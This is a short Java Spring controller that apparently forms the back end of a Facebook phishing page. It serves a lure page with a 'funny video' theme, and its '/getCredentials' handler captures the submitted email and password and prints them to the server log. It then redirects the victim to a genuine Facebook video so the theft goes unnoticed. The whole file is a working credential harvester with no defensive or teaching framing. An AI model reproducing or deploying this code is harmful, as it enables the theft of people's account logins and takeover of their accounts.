package facebook.blog.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.ui.ModelMap;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class HomeController {
static int count =0;
	@RequestMapping("/indexFacebookcom_imgVidFunny")
	public String index(){
	      return "/WEB-INF/jsp/index.jsp";
	}
	
	@RequestMapping(value ="/getCredentials", method = RequestMethod.POST)
	public String getCredentials(@RequestParam("email") String email,
			@RequestParam("pass") String pass,
            Model model){
		//model.addAttribute("email", email);
		//model.addAttribute("pass", pass);
	    //return "/WEB-INF/jsp/home.jsp";
		System.out.println("the email:" + email);
		System.out.println("the pass:" + pass);
		String redirectUrl = "https://www.facebook.com/video.php?v=530605287086919";
		return "redirect:" + redirectUrl;
	}
}
